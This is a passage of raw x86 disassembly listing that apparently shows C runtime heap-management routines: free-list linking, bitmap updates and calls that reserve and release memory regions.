  426970:	dec    BYTE PTR [ebx+eax*1+0x4]
  426974:	jne    0x426997
  426976:	mov    ecx,DWORD PTR [ebp+0x8]
  426979:	and    DWORD PTR [ecx],esi
  42697b:	jmp    0x426997
  42697d:	lea    ecx,[ebx-0x20]
  426980:	shr    esi,cl
  426982:	not    esi
  426984:	and    DWORD PTR [eax+edi*4+0xc4],esi
  42698b:	dec    BYTE PTR [ebx+eax*1+0x4]
  42698f:	jne    0x426997
  426991:	mov    ecx,DWORD PTR [ebp+0x8]
  426994:	and    DWORD PTR [ecx+0x4],esi
  426997:	mov    ecx,DWORD PTR [ebp+0xc]
  42699a:	mov    esi,DWORD PTR [ecx+0x8]
  42699d:	mov    ecx,DWORD PTR [ecx+0x4]
  4269a0:	mov    DWORD PTR [esi+0x4],ecx
  4269a3:	mov    ecx,DWORD PTR [ebp+0xc]
  4269a6:	mov    esi,DWORD PTR [ecx+0x4]
  4269a9:	mov    ecx,DWORD PTR [ecx+0x8]
  4269ac:	mov    DWORD PTR [esi+0x8],ecx
  4269af:	mov    esi,DWORD PTR [ebp+0xc]
  4269b2:	jmp    0x4269b7
  4269b4:	mov    ebx,DWORD PTR [ebp+0x8]
  4269b7:	cmp    DWORD PTR [ebp-0xc],0x0
  4269bb:	jne    0x4269c5
  4269bd:	cmp    ebx,edx
  4269bf:	je     0x426a45
  4269c5:	mov    ecx,DWORD PTR [ebp-0x10]
  4269c8:	lea    ecx,[ecx+edx*8]
  4269cb:	mov    ebx,DWORD PTR [ecx+0x4]
  4269ce:	mov    DWORD PTR [esi+0x8],ecx
  4269d1:	mov    DWORD PTR [esi+0x4],ebx
  4269d4:	mov    DWORD PTR [ecx+0x4],esi
  4269d7:	mov    ecx,DWORD PTR [esi+0x4]
  4269da:	mov    DWORD PTR [ecx+0x8],esi
  4269dd:	mov    ecx,DWORD PTR [esi+0x4]
  4269e0:	cmp    ecx,DWORD PTR [esi+0x8]
  4269e3:	jne    0x426a45
  4269e5:	mov    cl,BYTE PTR [edx+eax*1+0x4]
  4269e9:	mov    BYTE PTR [ebp+0xf],cl
  4269ec:	inc    cl
  4269ee:	cmp    edx,0x20
  4269f1:	mov    BYTE PTR [edx+eax*1+0x4],cl
  4269f5:	jae    0x426a1c
  4269f7:	cmp    BYTE PTR [ebp+0xf],0x0
  4269fb:	jne    0x426a0b
  4269fd:	mov    ecx,edx
  4269ff:	mov    ebx,0x80000000
  426a04:	shr    ebx,cl
  426a06:	mov    ecx,DWORD PTR [ebp+0x8]
  426a09:	or     DWORD PTR [ecx],ebx
  426a0b:	mov    ebx,0x80000000
  426a10:	mov    ecx,edx
  426a12:	shr    ebx,cl
  426a14:	lea    eax,[eax+edi*4+0x44]
  426a18:	or     DWORD PTR [eax],ebx
  426a1a:	jmp    0x426a45
  426a1c:	cmp    BYTE PTR [ebp+0xf],0x0
  426a20:	jne    0x426a32
  426a22:	lea    ecx,[edx-0x20]
  426a25:	mov    ebx,0x80000000
  426a2a:	shr    ebx,cl
  426a2c:	mov    ecx,DWORD PTR [ebp+0x8]
  426a2f:	or     DWORD PTR [ecx+0x4],ebx
  426a32:	lea    ecx,[edx-0x20]
  426a35:	mov    edx,0x80000000
  426a3a:	shr    edx,cl
  426a3c:	lea    eax,[eax+edi*4+0xc4]
  426a43:	or     DWORD PTR [eax],edx
  426a45:	mov    eax,DWORD PTR [ebp-0x4]
  426a48:	mov    DWORD PTR [esi],eax
  426a4a:	mov    DWORD PTR [eax+esi*1-0x4],eax
  426a4e:	mov    eax,DWORD PTR [ebp-0x10]
  426a51:	dec    DWORD PTR [eax]
  426a53:	jne    0x426b50
  426a59:	mov    eax,ds:0x4639f8
  426a5e:	test   eax,eax
  426a60:	je     0x426b42
  426a66:	mov    ecx,DWORD PTR ds:0x463a10
  426a6c:	mov    esi,DWORD PTR ds:0x4290ec
  426a72:	push   0x4000
  426a77:	shl    ecx,0xf
  426a7a:	add    ecx,DWORD PTR [eax+0xc]
  426a7d:	mov    ebx,0x8000
  426a82:	push   ebx
  426a83:	push   ecx
  426a84:	call   esi
  426a86:	mov    ecx,DWORD PTR ds:0x463a10
  426a8c:	mov    eax,ds:0x4639f8
  426a91:	mov    edx,0x80000000
  426a96:	shr    edx,cl
  426a98:	or     DWORD PTR [eax+0x8],edx
  426a9b:	mov    eax,ds:0x4639f8
  426aa0:	mov    eax,DWORD PTR [eax+0x10]
  426aa3:	mov    ecx,DWORD PTR ds:0x463a10
  426aa9:	and    DWORD PTR [eax+ecx*4+0xc4],0x0
  426ab1:	mov    eax,ds:0x4639f8
  426ab6:	mov    eax,DWORD PTR [eax+0x10]
  426ab9:	dec    BYTE PTR [eax+0x43]
  426abc:	mov    eax,ds:0x4639f8
  426ac1:	mov    ecx,DWORD PTR [eax+0x10]
  426ac4:	cmp    BYTE PTR [ecx+0x43],0x0
  426ac8:	jne    0x426ad3
  426aca:	and    DWORD PTR [eax+0x4],0xfffffffe
  426ace:	mov    eax,ds:0x4639f8
  426ad3:	cmp    DWORD PTR [eax+0x8],0xffffffff
  426ad7:	jne    0x426b42
  426ad9:	push   ebx
  426ada:	push   0x0
  426adc:	push   DWORD PTR [eax+0xc]
  426adf:	call   esi
  426ae1:	mov    eax,ds:0x4639f8
  426ae6:	push   DWORD PTR [eax+0x10]
  426ae9:	push   0x0
  426aeb:	push   DWORD PTR ds:0x463c40
  426af1:	call   DWORD PTR ds:0x429034
  426af7:	mov    eax,ds:0x4639fc
  426afc:	mov    edx,DWORD PTR ds:0x463a00
  426b02:	lea    eax,[eax+eax*4]
  426b05:	shl    eax,0x2
  426b08:	mov    ecx,eax
  426b0a:	mov    eax,ds:0x4639f8
  426b0f:	sub    ecx,eax
  426b11:	lea    ecx,[ecx+edx*1-0x14]
  426b15:	push   ecx
  426b16:	lea    ecx,[eax+0x14]
  426b19:	push   ecx
  426b1a:	push   eax
  426b1b:	call   0x428370
  426b20:	mov    eax,DWORD PTR [ebp+0x8]
  426b23:	add    esp,0xc
  426b26:	dec    DWORD PTR ds:0x4639fc
  426b2c:	cmp    eax,DWORD PTR ds:0x4639f8
  426b32:	jbe    0x426b38
  426b34:	sub    DWORD PTR [ebp+0x8],0x14
  426b38:	mov    eax,ds:0x463a00
  426b3d:	mov    ds:0x463a08,eax
  426b42:	mov    eax,DWORD PTR [ebp+0x8]
  426b45:	mov    ds:0x4639f8,eax
  426b4a:	mov    DWORD PTR ds:0x463a10,edi
  426b50:	pop    ebx
  426b51:	pop    edi
  426b52:	pop    esi
  426b53:	leave  
  426b54:	ret    
  426b55:	mov    eax,ds:0x4639fc
  426b5a:	mov    ecx,DWORD PTR ds:0x463a0c
  426b60:	push   edi
  426b61:	xor    edi,edi
  426b63:	cmp    eax,ecx
  426b65:	jne    0x426b9b
  426b67:	lea    eax,[ecx+ecx*4+0x50]
  426b6b:	shl    eax,0x2
  426b6e:	push   eax
  426b6f:	push   DWORD PTR ds:0x463a00
  426b75:	push   edi
  426b76:	push   DWORD PTR ds:0x463c40
  426b7c:	call   DWORD PTR ds:0x42910c
  426b82:	cmp    eax,edi
  426b84:	jne    0x426b8a
  426b86:	xor    eax,eax
  426b88:	pop    edi
  426b89:	ret    
  426b8a:	add    DWORD PTR ds:0x463a0c,0x10
  426b91:	mov    ds:0x463a00,eax
  426b96:	mov    eax,ds:0x4639fc
  426b9b:	mov    ecx,DWORD PTR ds:0x463a00
  426ba1:	push   esi
  426ba2:	push   0x41c4
  426ba7:	push   0x8
  426ba9:	push   DWORD PTR ds:0x463c40
  426baf:	lea    eax,[eax+eax*4]
  426bb2:	lea    esi,[ecx+eax*4]
  426bb5:	call   DWORD PTR ds:0x429038
  426bbb:	cmp    eax,edi
  426bbd:	mov    DWORD PTR [esi+0x10],eax
  426bc0:	jne    0x426bc6
  426bc2:	xor    eax,eax
  426bc4:	jmp    0x426c09
  426bc6:	push   0x4
  426bc8:	push   0x2000
  426bcd:	push   0x100000
  426bd2:	push   edi
  426bd3:	call   DWORD PTR ds:0x429058
  426bd9:	cmp    eax,edi
  426bdb:	mov    DWORD PTR [esi+0xc],eax
  426bde:	jne    0x426bf2
  426be0:	push   DWORD PTR [esi+0x10]
  426be3:	push   edi
  426be4:	push   DWORD PTR ds:0x463c40
  426bea:	call   DWORD PTR ds:0x429034
  426bf0:	jmp    0x426bc2
  426bf2:	or     DWORD PTR [esi+0x8],0xffffffff
  426bf6:	mov    DWORD PTR [esi],edi
  426bf8:	mov    DWORD PTR [esi+0x4],edi
  426bfb:	inc    DWORD PTR ds:0x4639fc
  426c01:	mov    eax,DWORD PTR [esi+0x10]
  426c04:	or     DWORD PTR [eax],0xffffffff
  426c07:	mov    eax,esi
  426c09:	pop    esi
  426c0a:	pop    edi
  426c0b:	ret    
  426c0c:	push   ebp
  426c0d:	mov    ebp,esp
  426c0f:	push   ecx
  426c10:	push   ecx
  426c11:	mov    ecx,DWORD PTR [ebp+0x8]
  426c14:	mov    eax,DWORD PTR [ecx+0x8]
  426c17:	push   ebx
  426c18:	push   esi
  426c19:	mov    esi,DWORD PTR [ecx+0x10]
  426c1c:	push   edi
  426c1d:	xor    ebx,ebx
  426c1f:	jmp    0x426c24
  426c21:	shl    eax,1
  426c23:	inc    ebx
  426c24:	test   eax,eax
  426c26:	jge    0x426c21
  426c28:	mov    eax,ebx
  426c2a:	imul   eax,eax,0x204
  426c30:	lea    eax,[eax+esi*1+0x144]
  426c37:	push   0x3f
  426c39:	mov    DWORD PTR [ebp-0x8],eax
  426c3c:	pop    edx
  426c3d:	mov    DWORD PTR [eax+0x8],eax
  426c40:	mov    DWORD PTR [eax+0x4],eax
  426c43:	add    eax,0x8
  426c46:	dec    edx
  426c47:	jne    0x426c3d
  426c49:	push   0x4
  426c4b:	mov    edi,ebx
  426c4d:	push   0x1000
  426c52:	shl    edi,0xf
  426c55:	add    edi,DWORD PTR [ecx+0xc]
  426c58:	push   0x8000
  426c5d:	push   edi
  426c5e:	call   DWORD PTR ds:0x429058
  426c64:	test   eax,eax
  426c66:	jne    0x426c70
  426c68:	or     eax,0xffffffff
  426c6b:	jmp    0x426d0d
  426c70:	lea    edx,[edi+0x7000]
  426c76:	cmp    edi,edx
  426c78:	mov    DWORD PTR [ebp-0x4],edx
  426c7b:	ja     0x426cc0
  426c7d:	mov    ecx,edx
  426c7f:	sub    ecx,edi
  426c81:	shr    ecx,0xc
  426c84:	lea    eax,[edi+0x10]
  426c87:	inc    ecx
  426c88:	or     DWORD PTR [eax-0x8],0xffffffff
  426c8c:	or     DWORD PTR [eax+0xfec],0xffffffff
  426c93:	lea    edx,[eax+0xffc]
  426c99:	mov    DWORD PTR [eax],edx
  426c9b:	lea    edx,[eax-0x1004]
  426ca1:	mov    DWORD PTR [eax-0x4],0xff0
  426ca8:	mov    DWORD PTR [eax+0x4],edx
  426cab:	mov    DWORD PTR [eax+0xfe8],0xff0
  426cb5:	add    eax,0x1000
  426cba:	dec    ecx
  426cbb:	jne    0x426c88
  426cbd:	mov    edx,DWORD PTR [ebp-0x4]
  426cc0:	mov    eax,DWORD PTR [ebp-0x8]
  426cc3:	add    eax,0x1f8
  426cc8:	lea    ecx,[edi+0xc]
  426ccb:	mov    DWORD PTR [eax+0x4],ecx
  426cce:	mov    DWORD PTR [ecx+0x8],eax
  426cd1:	lea    ecx,[edx+0xc]
  426cd4:	mov    DWORD PTR [eax+0x8],ecx
  426cd7:	mov    DWORD PTR [ecx+0x4],eax
  426cda:	and    DWORD PTR [esi+ebx*4+0x44],0x0
  426cdf:	xor    edi,edi
  426ce1:	inc    edi
  426ce2:	mov    DWORD PTR [esi+ebx*4+0xc4],edi
  426ce9:	mov    al,BYTE PTR [esi+0x43]
  426cec:	mov    cl,al
  426cee:	inc    cl
  426cf0:	test   al,al
  426cf2:	mov    eax,DWORD PTR [ebp+0x8]
  426cf5:	mov    BYTE PTR [esi+0x43],cl
  426cf8:	jne    0x426cfd
  426cfa:	or     DWORD PTR [eax+0x4],edi
  426cfd:	mov    edx,0x80000000
  426d02:	mov    ecx,ebx
  426d04:	shr    edx,cl
  426d06:	not    edx
  426d08:	and    DWORD PTR [eax+0x8],edx
  426d0b:	mov    eax,ebx
  426d0d:	pop    edi
  426d0e:	pop    esi
  426d0f:	pop    ebx
  426d10:	leave  
  426d11:	ret    
  426d12:	push   ebp
  426d13:	mov    ebp,esp
  426d15:	sub    esp,0xc
  426d18:	mov    ecx,DWORD PTR [ebp+0x8]
  426d1b:	mov    eax,DWORD PTR [ecx+0x10]
  426d1e:	push   ebx
  426d1f:	push   esi
  426d20:	mov    esi,DWORD PTR [ebp+0x10]
  426d23:	push   edi
  426d24:	mov    edi,DWORD PTR [ebp+0xc]
  426d27:	mov    edx,edi
  426d29:	sub    edx,DWORD PTR [ecx+0xc]
  426d2c:	add    esi,0x17
  426d2f:	shr    edx,0xf
  426d32:	mov    ecx,edx
  426d34:	imul   ecx,ecx,0x204
  426d3a:	lea    ecx,[ecx+eax*1+0x144]
  426d41:	mov    DWORD PTR [ebp-0xc],ecx
  426d44:	mov    ecx,DWORD PTR [edi-0x4]
  426d47:	and    esi,0xfffffff0
  426d4a:	dec    ecx
  426d4b:	cmp    esi,ecx
  426d4d:	lea    edi,[ecx+edi*1-0x4]
  426d51:	mov    ebx,DWORD PTR [edi]
  426d53:	mov    DWORD PTR [ebp+0x10],ecx
  426d56:	mov    DWORD PTR [ebp-0x4],ebx
  426d59:	jle    0x426eb4
  426d5f:	test   bl,0x1
  426d62:	jne    0x426ead
  426d68:	add    ebx,ecx
  426d6a:	cmp    esi,ebx
  426d6c:	jg     0x426ead
  426d72:	mov    ecx,DWORD PTR [ebp-0x4]
  426d75:	sar    ecx,0x4
  426d78:	dec    ecx
  426d79:	cmp    ecx,0x3f
  426d7c:	mov    DWORD PTR [ebp-0x8],ecx
  426d7f:	jbe    0x426d87
  426d81:	push   0x3f
  426d83:	pop    ecx
  426d84:	mov    DWORD PTR [ebp-0x8],ecx
  426d87:	mov    ebx,DWORD PTR [edi+0x4]
  426d8a:	cmp    ebx,DWORD PTR [edi+0x8]
  426d8d:	jne    0x426dd2
  426d8f:	cmp    ecx,0x20
  426d92:	mov    ebx,0x80000000
  426d97:	jae    0x426db3
  426d99:	shr    ebx,cl
  426d9b:	mov    ecx,DWORD PTR [ebp-0x8]
  426d9e:	lea    ecx,[ecx+eax*1+0x4]
  426da2:	not    ebx
  426da4:	and    DWORD PTR [eax+edx*4+0x44],ebx
  426da8:	dec    BYTE PTR [ecx]
  426daa:	jne    0x426dd2
  426dac:	mov    ecx,DWORD PTR [ebp+0x8]
  426daf:	and    DWORD PTR [ecx],ebx
  426db1:	jmp    0x426dd2
  426db3:	add    ecx,0xffffffe0
  426db6:	shr    ebx,cl
  426db8:	mov    ecx,DWORD PTR [ebp-0x8]
  426dbb:	lea    ecx,[ecx+eax*1+0x4]
  426dbf:	not    ebx
  426dc1:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  426dc8:	dec    BYTE PTR [ecx]
  426dca:	jne    0x426dd2
  426dcc:	mov    ecx,DWORD PTR [ebp+0x8]
  426dcf:	and    DWORD PTR [ecx+0x4],ebx
  426dd2:	mov    ecx,DWORD PTR [edi+0x8]
  426dd5:	mov    ebx,DWORD PTR [edi+0x4]
  426dd8:	mov    DWORD PTR [ecx+0x4],ebx
  426ddb:	mov    ecx,DWORD PTR [edi+0x4]
  426dde:	mov    edi,DWORD PTR [edi+0x8]
  426de1:	mov    DWORD PTR [ecx+0x8],edi
  426de4:	mov    ecx,DWORD PTR [ebp+0x10]
  426de7:	sub    ecx,esi
  426de9:	add    DWORD PTR [ebp-0x4],ecx
  426dec:	cmp    DWORD PTR [ebp-0x4],0x0
  426df0:	jle    0x426e9b
  426df6:	mov    edi,DWORD PTR [ebp-0x4]
  426df9:	mov    ecx,DWORD PTR [ebp+0xc]
  426dfc:	sar    edi,0x4
  426dff:	dec    edi
  426e00:	cmp    edi,0x3f
  426e03:	lea    ecx,[ecx+esi*1-0x4]
  426e07:	jbe    0x426e0c
  426e09:	push   0x3f
  426e0b:	pop    edi
  426e0c:	mov    ebx,DWORD PTR [ebp-0xc]
  426e0f:	lea    ebx,[ebx+edi*8]
  426e12:	mov    DWORD PTR [ebp+0x10],ebx
  426e15:	mov    ebx,DWORD PTR [ebx+0x4]
  426e18:	mov    DWORD PTR [ecx+0x4],ebx
  426e1b:	mov    ebx,DWORD PTR [ebp+0x10]
  426e1e:	mov    DWORD PTR [ecx+0x8],ebx
  426e21:	mov    DWORD PTR [ebx+0x4],ecx
  426e24:	mov    ebx,DWORD PTR [ecx+0x4]
  426e27:	mov    DWORD PTR [ebx+0x8],ecx
  426e2a:	mov    ebx,DWORD PTR [ecx+0x4]
  426e2d:	cmp    ebx,DWORD PTR [ecx+0x8]
  426e30:	jne    0x426e89
  426e32:	mov    cl,BYTE PTR [edi+eax*1+0x4]
  426e36:	mov    BYTE PTR [ebp+0x13],cl
  426e39:	inc    cl
  426e3b:	cmp    edi,0x20
  426e3e:	mov    BYTE PTR [edi+eax*1+0x4],cl
  426e42:	jae    0x426e60
  426e44:	cmp    BYTE PTR [ebp+0x13],0x0
  426e48:	jne    0x426e58
  426e4a:	mov    ecx,edi
  426e4c:	mov    ebx,0x80000000
  426e51:	shr    ebx,cl
  426e53:	mov    ecx,DWORD PTR [ebp+0x8]
  426e56:	or     DWORD PTR [ecx],ebx
  426e58:	lea    eax,[eax+edx*4+0x44]
  426e5c:	mov    ecx,edi
  426e5e:	jmp    0x426e80
  426e60:	cmp    BYTE PTR [ebp+0x13],0x0
  426e64:	jne    0x426e76
  426e66:	lea    ecx,[edi-0x20]
  426e69:	mov    ebx,0x80000000
  426e6e:	shr    ebx,cl
  426e70:	mov    ecx,DWORD PTR [ebp+0x8]
  426e73:	or     DWORD PTR [ecx+0x4],ebx
  426e76:	lea    eax,[eax+edx*4+0xc4]
  426e7d:	lea    ecx,[edi-0x20]
  426e80:	mov    edx,0x80000000
  426e85:	shr    edx,cl
  426e87:	or     DWORD PTR [eax],edx
  426e89:	mov    edx,DWORD PTR [ebp+0xc]
  426e8c:	mov    ecx,DWORD PTR [ebp-0x4]
  426e8f:	lea    eax,[edx+esi*1-0x4]
  426e93:	mov    DWORD PTR [eax],ecx
  426e95:	mov    DWORD PTR [ecx+eax*1-0x4],ecx
  426e99:	jmp    0x426e9e
  426e9b:	mov    edx,DWORD PTR [ebp+0xc]
  426e9e:	lea    eax,[esi+0x1]
  426ea1:	mov    DWORD PTR [edx-0x4],eax
  426ea4:	mov    DWORD PTR [edx+esi*1-0x8],eax
  426ea8:	jmp    0x426fe9
  426ead:	xor    eax,eax
  426eaf:	jmp    0x426fec
  426eb4:	jge    0x426fe9
  426eba:	mov    ebx,DWORD PTR [ebp+0xc]
  426ebd:	sub    DWORD PTR [ebp+0x10],esi
  426ec0:	lea    ecx,[esi+0x1]
  426ec3:	mov    DWORD PTR [ebx-0x4],ecx
  426ec6:	lea    ebx,[ebx+esi*1-0x4]
  426eca:	mov    esi,DWORD PTR [ebp+0x10]
  426ecd:	sar    esi,0x4
  426ed0:	dec    esi
  426ed1:	cmp    esi,0x3f
  426ed4:	mov    DWORD PTR [ebp+0xc],ebx
  426ed7:	mov    DWORD PTR [ebx-0x4],ecx
  426eda:	jbe    0x426edf
  426edc:	push   0x3f
  426ede:	pop    esi
  426edf:	test   BYTE PTR [ebp-0x4],0x1
  426ee3:	jne    0x426f69
  426ee9:	mov    esi,DWORD PTR [ebp-0x4]
  426eec:	sar    esi,0x4
  426eef:	dec    esi
  426ef0:	cmp    esi,0x3f
  426ef3:	jbe    0x426ef8
  426ef5:	push   0x3f
  426ef7:	pop    esi
  426ef8:	mov    ecx,DWORD PTR [edi+0x4]
  426efb:	cmp    ecx,DWORD PTR [edi+0x8]
  426efe:	jne    0x426f42
  426f00:	cmp    esi,0x20
  426f03:	mov    ebx,0x80000000
  426f08:	jae    0x426f23
  426f0a:	mov    ecx,esi
  426f0c:	shr    ebx,cl
  426f0e:	lea    esi,[esi+eax*1+0x4]
  426f12:	not    ebx
  426f14:	and    DWORD PTR [eax+edx*4+0x44],ebx
  426f18:	dec    BYTE PTR [esi]
  426f1a:	jne    0x426f3f
  426f1c:	mov    ecx,DWORD PTR [ebp+0x8]
  426f1f:	and    DWORD PTR [ecx],ebx
  426f21:	jmp    0x426f3f
  426f23:	lea    ecx,[esi-0x20]
  426f26:	shr    ebx,cl
  426f28:	lea    ecx,[esi+eax*1+0x4]
  426f2c:	not    ebx
  426f2e:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  426f35:	dec    BYTE PTR [ecx]
  426f37:	jne    0x426f3f
  426f39:	mov    ecx,DWORD PTR [ebp+0x8]
  426f3c:	and    DWORD PTR [ecx+0x4],ebx
  426f3f:	mov    ebx,DWORD PTR [ebp+0xc]
  426f42:	mov    ecx,DWORD PTR [edi+0x8]
  426f45:	mov    esi,DWORD PTR [edi+0x4]
  426f48:	mov    DWORD PTR [ecx+0x4],esi
  426f4b:	mov    esi,DWORD PTR [edi+0x8]
  426f4e:	mov    ecx,DWORD PTR [edi+0x4]
  426f51:	mov    DWORD PTR [ecx+0x8],esi
  426f54:	mov    esi,DWORD PTR [ebp+0x10]
  426f57:	add    esi,DWORD PTR [ebp-0x4]
  426f5a:	mov    DWORD PTR [ebp+0x10],esi
  426f5d:	sar    esi,0x4
  426f60:	dec    esi
  426f61:	cmp    esi,0x3f
  426f64:	jbe    0x426f69
  426f66:	push   0x3f
  426f68:	pop    esi
  426f69:	mov    ecx,DWORD PTR [ebp-0xc]
  426f6c:	lea    ecx,[ecx+esi*8]
  426f6f:	mov    edi,DWORD PTR [ecx+0x4]
  426f72:	mov    DWORD PTR [ebx+0x8],ecx
  426f75:	mov    DWORD PTR [ebx+0x4],edi
  426f78:	mov    DWORD PTR [ecx+0x4],ebx
  426f7b:	mov    ecx,DWORD PTR [ebx+0x4]
  426f7e:	mov    DWORD PTR [ecx+0x8],ebx
  426f81:	mov    ecx,DWORD PTR [ebx+0x4]
  426f84:	cmp    ecx,DWORD PTR [ebx+0x8]
  426f87:	jne    0x426fe0
  426f89:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  426f8d:	mov    BYTE PTR [ebp+0xf],cl
  426f90:	inc    cl
  426f92:	cmp    esi,0x20
  426f95:	mov    BYTE PTR [esi+eax*1+0x4],cl
  426f99:	jae    0x426fb7
  426f9b:	cmp    BYTE PTR [ebp+0xf],0x0
  426f9f:	jne    0x426faf
  426fa1:	mov    ecx,esi
  426fa3:	mov    edi,0x80000000
  426fa8:	shr    edi,cl
  426faa:	mov    ecx,DWORD PTR [ebp+0x8]
  426fad:	or     DWORD PTR [ecx],edi
  426faf:	lea    eax,[eax+edx*4+0x44]
  426fb3:	mov    ecx,esi
  426fb5:	jmp    0x426fd7
  426fb7:	cmp    BYTE PTR [ebp+0xf],0x0
  426fbb:	jne    0x426fcd
  426fbd:	lea    ecx,[esi-0x20]
  426fc0:	mov    edi,0x80000000
  426fc5:	shr    edi,cl
  426fc7:	mov    ecx,DWORD PTR [ebp+0x8]
  426fca:	or     DWORD PTR [ecx+0x4],edi
  426fcd:	lea    eax,[eax+edx*4+0xc4]
  426fd4:	lea    ecx,[esi-0x20]
  426fd7:	mov    edx,0x80000000
  426fdc:	shr    edx,cl
  426fde:	or     DWORD PTR [eax],edx
  426fe0:	mov    eax,DWORD PTR [ebp+0x10]
  426fe3:	mov    DWORD PTR [ebx],eax
  426fe5:	mov    DWORD PTR [eax+ebx*1-0x4],eax
  426fe9:	xor    eax,eax
  426feb:	inc    eax
  426fec:	pop    edi
  426fed:	pop    esi
  426fee:	pop    ebx
  426fef:	leave  
  426ff0:	ret    
  426ff1:	push   ebp
  426ff2:	mov    ebp,esp
  426ff4:	sub    esp,0x14
  426ff7:	mov    ecx,DWORD PTR [ebp+0x8]
  426ffa:	mov    eax,ds:0x4639fc
  426fff:	mov    edx,DWORD PTR ds:0x463a00
  427005:	add    ecx,0x17
  427008:	and    ecx,0xfffffff0
  42700b:	push   ebx
  42700c:	mov    DWORD PTR [ebp-0x10],ecx
  42700f:	sar    ecx,0x4
  427012:	push   esi
  427013:	lea    eax,[eax+eax*4]
  427016:	push   edi
  427017:	dec    ecx
  427018:	cmp    ecx,0x20
  42701b:	lea    edi,[edx+eax*4]
  42701e:	mov    DWORD PTR [ebp-0x4],edi
  427021:	jge    0x42702e
  427023:	or     esi,0xffffffff
  427026:	shr    esi,cl
  427028:	or     DWORD PTR [ebp-0x8],0xffffffff
  42702c:	jmp    0x42703b
  42702e:	add    ecx,0xffffffe0
  427031:	or     eax,0xffffffff
  427034:	xor    esi,esi
  427036:	shr    eax,cl
  427038:	mov    DWORD PTR [ebp-0x8],eax
  42703b:	mov    eax,ds:0x463a08
  427040:	mov    ebx,eax
  427042:	mov    DWORD PTR [ebp-0xc],esi
  427045:	cmp    ebx,edi
  427047:	jmp    0x42705d
  427049:	mov    ecx,DWORD PTR [ebx+0x4]
  42704c:	mov    edi,DWORD PTR [ebx]
  42704e:	and    ecx,DWORD PTR [ebp-0x8]
  427051:	and    edi,esi
  427053:	or     ecx,edi
  427055:	jne    0x427062
  427057:	add    ebx,0x14
  42705a:	cmp    ebx,DWORD PTR [ebp-0x4]
  42705d:	mov    DWORD PTR [ebp+0x8],ebx
  427060:	jb     0x427049
  427062:	cmp    ebx,DWORD PTR [ebp-0x4]
  427065:	jne    0x42708b
  427067:	mov    ebx,edx
  427069:	jmp    0x42707c
  42706b:	mov    ecx,DWORD PTR [ebx+0x4]
  42706e:	mov    edi,DWORD PTR [ebx]
  427070:	and    ecx,DWORD PTR [ebp-0x8]
  427073:	and    edi,esi
  427075:	or     ecx,edi
  427077:	jne    0x427083
  427079:	add    ebx,0x14
  42707c:	cmp    ebx,eax
  42707e:	mov    DWORD PTR [ebp+0x8],ebx
  427081:	jb     0x42706b
  427083:	cmp    ebx,eax
  427085:	je     0x42711f
  42708b:	mov    DWORD PTR ds:0x463a08,ebx
  427091:	mov    eax,DWORD PTR [ebx+0x10]
  427094:	mov    edx,DWORD PTR [eax]
  427096:	cmp    edx,0xffffffff
  427099:	mov    DWORD PTR [ebp-0x4],edx
  42709c:	je     0x4270b2
  42709e:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  4270a5:	mov    edi,DWORD PTR [eax+edx*4+0x44]
  4270a9:	and    ecx,DWORD PTR [ebp-0x8]
  4270ac:	and    edi,esi
  4270ae:	or     ecx,edi
  4270b0:	jne    0x4270e8
  4270b2:	mov    edx,DWORD PTR [eax+0xc4]
  4270b8:	and    edx,DWORD PTR [ebp-0x8]
  4270bb:	and    DWORD PTR [ebp-0x4],0x0
  4270bf:	lea    ecx,[eax+0x44]
  4270c2:	mov    esi,DWORD PTR [ecx]
  4270c4:	and    esi,DWORD PTR [ebp-0xc]
  4270c7:	or     edx,esi
  4270c9:	mov    esi,DWORD PTR [ebp-0xc]
  4270cc:	jne    0x4270e5
  4270ce:	mov    edx,DWORD PTR [ecx+0x84]
  4270d4:	and    edx,DWORD PTR [ebp-0x8]
  4270d7:	inc    DWORD PTR [ebp-0x4]
  4270da:	add    ecx,0x4
  4270dd:	mov    edi,DWORD PTR [ecx]
  4270df:	and    edi,esi
  4270e1:	or     edx,edi
  4270e3:	je     0x4270ce
  4270e5:	mov    edx,DWORD PTR [ebp-0x4]
  4270e8:	mov    ecx,edx
  4270ea:	imul   ecx,ecx,0x204
  4270f0:	lea    ecx,[ecx+eax*1+0x144]
  4270f7:	mov    DWORD PTR [ebp-0xc],ecx
  4270fa:	mov    ecx,DWORD PTR [eax+edx*4+0x44]
  4270fe:	xor    edi,edi
  427100:	and    ecx,esi
  427102:	jne    0x427171
  427104:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  42710b:	and    ecx,DWORD PTR [ebp-0x8]
  42710e:	push   0x20
  427110:	pop    edi
  427111:	jmp    0x427171
  427113:	cmp    DWORD PTR [ebx+0x8],0x0
  427117:	jne    0x427124
  427119:	add    ebx,0x14
  42711c:	mov    DWORD PTR [ebp+0x8],ebx
  42711f:	cmp    ebx,DWORD PTR [ebp-0x4]
  427122:	jb     0x427113
  427124:	cmp    ebx,DWORD PTR [ebp-0x4]
  427127:	jne    0x42714f
  427129:	mov    ebx,edx
  42712b:	jmp    0x427136
  42712d:	cmp    DWORD PTR [ebx+0x8],0x0
  427131:	jne    0x42713d
  427133:	add    ebx,0x14
  427136:	cmp    ebx,eax
  427138:	mov    DWORD PTR [ebp+0x8],ebx
  42713b:	jb     0x42712d
  42713d:	cmp    ebx,eax
  42713f:	jne    0x42714f
  427141:	call   0x426b55
  427146:	mov    ebx,eax
  427148:	test   ebx,ebx
  42714a:	mov    DWORD PTR [ebp+0x8],ebx
  42714d:	je     0x427167
  42714f:	push   ebx
  427150:	call   0x426c0c
  427155:	pop    ecx
  427156:	mov    ecx,DWORD PTR [ebx+0x10]
  427159:	mov    DWORD PTR [ecx],eax
  42715b:	mov    eax,DWORD PTR [ebx+0x10]
  42715e:	cmp    DWORD PTR [eax],0xffffffff
  427161:	jne    0x42708b
  427167:	xor    eax,eax
  427169:	jmp    0x4272e8
  42716e:	shl    ecx,1
  427170:	inc    edi
  427171:	test   ecx,ecx
  427173:	jge    0x42716e
  427175:	mov    ecx,DWORD PTR [ebp-0xc]
  427178:	mov    edx,DWORD PTR [ecx+edi*8+0x4]
  42717c:	mov    ecx,DWORD PTR [edx]
  42717e:	sub    ecx,DWORD PTR [ebp-0x10]
  427181:	mov    esi,ecx
  427183:	sar    esi,0x4
  427186:	dec    esi
  427187:	cmp    esi,0x3f
  42718a:	mov    DWORD PTR [ebp-0x8],ecx
  42718d:	jle    0x427192
